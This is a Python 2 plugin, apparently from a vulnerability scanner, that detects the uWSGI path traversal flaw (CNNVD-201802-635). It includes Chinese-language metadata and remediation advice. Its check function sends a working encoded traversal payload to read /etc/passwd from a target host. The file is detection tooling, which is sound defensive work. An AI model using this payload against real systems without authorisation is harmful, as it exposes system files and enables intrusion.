#!/usr/bin/env python 
# -*- coding:utf-8 -*-

import requests

def get_plugin_info():
    plugin_info = {
        "name": "uWSGI 路径遍历漏洞",
        "info": "uWSGI 2.0.17之前版本中存在路径遍历漏洞，该漏洞源于程序没有正确的处理DOCUMENT_ROOT检测。攻击者可通过发送带有‘..’序列的特制URL请求利用该漏洞查看系统上的任意文件。",
        "level": "h",
        "type": "任意文件读取",
        "url": "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201802-635",
        "feature": "none",
        "is_web": 1,
        "is_pwd": 0,
        "solution": "1、在打补丁前，应限制问题设备的互联网访问权限。2、安装新的版本"
    }
    return plugin_info


def check(ip, port, timeout, is_debug=True, task_id=-1):
    try:
        payload = "/..%2f..%2f..%2f..%2f..%2fetc/passwd"
        url = "http://" + ip + ":" + str(port) + payload
        # print url
        r = requests.get(url, timeout=timeout)
        r.encoding = "utf-8"
        data = r.text
        # print data
        if 'root:' in data and 'nobody:' in data:
            return u"uWSGI directory traversal vulnerabilities."
    except:
        # print"the plugin execute failed."
        pass

# 以下为本地测试代码
# if __name__ == "__main__":
#     str = check("192.168.166.10", "8080", 3,)
#     if (str):
#         print str
#     else:
#         print u"不存在此漏洞"